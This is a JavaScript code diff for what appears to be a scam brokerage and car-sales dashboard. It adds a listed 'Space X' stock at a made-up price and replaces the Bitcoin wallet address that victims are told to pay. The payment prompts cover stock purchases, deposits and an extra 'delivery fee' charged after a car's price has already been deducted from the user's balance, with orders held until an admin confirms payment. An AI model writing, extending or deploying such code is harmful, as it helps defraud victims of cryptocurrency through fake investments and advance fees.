@@ -383,13 +383,13 @@ async function initDashboard() {
     // ---------- Live ticker ----------
     const tickers = {
         tsla: 245.50, rivn: 15.80, lcid: 3.45, nio: 5.20,
-        xpev: 8.10, li: 25.40, f: 12.30
+        xpev: 8.10, li: 25.40, f: 12.30, spcx: 140.30
     };
     const tickerIds = {
         tsla: { p: 'tickTsla', c: 'tickTslaPct' }, rivn: { p: 'tickRivn', c: 'tickRivnPct' },
         lcid: { p: 'tickLcid', c: 'tickLcidPct' }, nio: { p: 'tickNio', c: 'tickNioPct' },
         xpev: { p: 'tickXpev', c: 'tickXpevPct' }, li: { p: 'tickLi', c: 'tickLiPct' },
-        f: { p: 'tickF', c: 'tickFPct' }
+        f: { p: 'tickF', c: 'tickFPct' }, spcx: { p: 'tickSpcx', c: 'tickSpcxPct' }
     };
     function tick() {
         Object.keys(tickers).forEach(k => {
@@ -422,7 +422,8 @@ async function initDashboard() {
         { symbol: 'NIO', name: 'NIO Inc.', price: 5.20, exchange: 'NYSE' },
         { symbol: 'XPEV', name: 'XPeng Inc.', price: 8.10, exchange: 'NYSE' },
         { symbol: 'LI', name: 'Li Auto Inc.', price: 25.40, exchange: 'NASDAQ' },
-        { symbol: 'F', name: 'Ford Motor Company', price: 12.30, exchange: 'NYSE' }
+        { symbol: 'F', name: 'Ford Motor Company', price: 12.30, exchange: 'NYSE' },
+        { symbol: 'SPCX', name: 'Space X', price: 140.30, exchange: 'NASDAQ' }
     ];
 
     const plansListEl = document.getElementById('plansList');
@@ -495,7 +496,7 @@ async function initDashboard() {
             planModal.style.display = 'none';
             showModal({
                 type: 'success', title: 'Stock Purchase Submitted',
-                text: `${qty} share${qty > 1 ? 's' : ''} of ${stockName} (${stockSymbol})\nTotal Cost: $${totalCost.toFixed(2)}\n\nSend payment to:\n1D3FiQUNbT4aT9yUN4sWry3rFiSA8neuCQ\n\nYour order will be executed once the admin confirms your payment.`,
+                text: `${qty} share${qty > 1 ? 's' : ''} of ${stockName} (${stockSymbol})\nTotal Cost: $${totalCost.toFixed(2)}\n\nSend payment to:\n35q7HRHk73ZrvbYrrez8RpM7CcSUb8HPux\n\nYour order will be executed once the admin confirms your payment.`,
                 buttons: [{ label: 'GOT IT', style: 'primary', action: () => hideModal() }]
             });
         } catch (err) {
@@ -571,7 +572,7 @@ async function initDashboard() {
             if (!user) return;
             await saveDeposit({
                 id: Date.now(), userUid: fbUser.uid, name: user.name, email: user.email,
-                amount: depAmount, method: 'BTC', wallet: '1D3FiQUNbT4aT9yUN4sWry3rFiSA8neuCQ',
+                amount: depAmount, method: 'BTC', wallet: '35q7HRHk73ZrvbYrrez8RpM7CcSUb8HPux',
                 status: 'pending', requestedAt: new Date().toISOString()
             });
             document.getElementById('successAmount').textContent = '$' + depAmount.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
@@ -940,7 +941,7 @@ async function initDashboard() {
                 document.getElementById('purchaseModal').style.display = 'none';
                 showModal({
                     type: 'success', title: 'Order Confirmed!',
-                    text: `${car.name} — $${car.price.toLocaleString()}\nDeducted from your balance.\n\nNEXT STEP — PAY DELIVERY FEE\n\nTo start your shipment, pay the $${DELIVERY_FEE} delivery fee to:\n1D3FiQUNbT4aT9yUN4sWry3rFiSA8neuCQ\n\nThen contact Customer Service to schedule delivery.`,
+                    text: `${car.name} — $${car.price.toLocaleString()}\nDeducted from your balance.\n\nNEXT STEP — PAY DELIVERY FEE\n\nTo start your shipment, pay the $${DELIVERY_FEE} delivery fee to:\n35q7HRHk73ZrvbYrrez8RpM7CcSUb8HPux\n\nThen contact Customer Service to schedule delivery.`,
                     buttons: [{ label: 'GOT IT', style: 'primary', action: () => hideModal() }]
                 });
                 await updateUI();
